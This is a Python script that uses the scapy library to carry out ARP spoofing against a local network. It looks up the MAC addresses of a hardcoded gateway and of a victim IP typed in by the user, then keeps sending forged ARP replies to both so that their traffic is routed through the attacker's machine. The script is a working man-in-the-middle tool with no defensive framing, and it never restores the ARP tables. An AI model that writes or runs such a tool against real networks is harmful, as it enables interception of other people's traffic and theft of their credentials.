import scapy.all as scapy
import time
#enable ip forwarding to send packets meant for the targets and router

stop_spoofing = False

GATEWAY_IP="192.168.68.1"

def spoof(target_ip,target_mac,spoof_ip):
    spoofed_arp_packet=scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip,op="is-at")
    scapy.send(spoofed_arp_packet)

def get_mac(ip):
    arp_request=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /scapy.ARP(pdst=ip)
    reply,_=scapy.srp(arp_request,timeout = 3,verbose=0)
    if reply:
        return reply[0][1].src
    return None


def wait_for_target_mac(ip):
    mac=None
    while not mac:
        mac=get_mac(ip)
        if not mac:
            print(f"MAC adress for {ip} not found\n")
    return mac


def start_spoof(victim_ip):
    gateway_mac=wait_for_target_mac(GATEWAY_IP)
    target_mac=wait_for_target_mac(victim_ip)
    while stop_spoofing == False:
        spoof(target_ip=victim_ip,target_mac=target_mac,spoof_ip=GATEWAY_IP)
        spoof(target_ip=GATEWAY_IP,target_mac=gateway_mac,spoof_ip=victim_ip)
        print("active")
        time.sleep(0.5)

if __name__ == "__main__":
    start_spoof(input("enter victim ip: "))
